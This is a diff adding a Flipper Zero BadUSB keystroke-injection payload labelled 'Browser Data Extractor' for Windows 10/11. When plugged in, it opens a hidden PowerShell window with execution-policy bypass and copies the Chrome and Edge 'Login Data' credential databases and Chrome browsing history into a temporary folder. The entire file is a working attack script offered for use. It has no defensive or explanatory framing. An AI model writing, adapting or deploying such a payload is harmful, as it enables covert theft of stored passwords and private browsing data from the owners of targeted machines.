@@ -1,0 +1,27 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB  
+REM Payload: Browser Data Extractor
+REM Target: Windows 10/11 (Chrome/Edge)
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+ENTER
+STRING $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+ENTER
+STRING $out = "$env:TEMP\browser_data"
+ENTER
+STRING New-Item -ItemType Directory -Force -Path $out | Out-Null
+ENTER
+STRING if(Test-Path "$chromePath\Login Data"){Copy-Item "$chromePath\Login Data" "$out\chrome_logins.db"}
+ENTER
+STRING if(Test-Path "$chromePath\History"){Copy-Item "$chromePath\History" "$out\chrome_history.db"}
+ENTER
+STRING if(Test-Path "$edgePath\Login Data"){Copy-Item "$edgePath\Login Data" "$out\edge_logins.db"}
+ENTER
+STRING exit
+ENTER
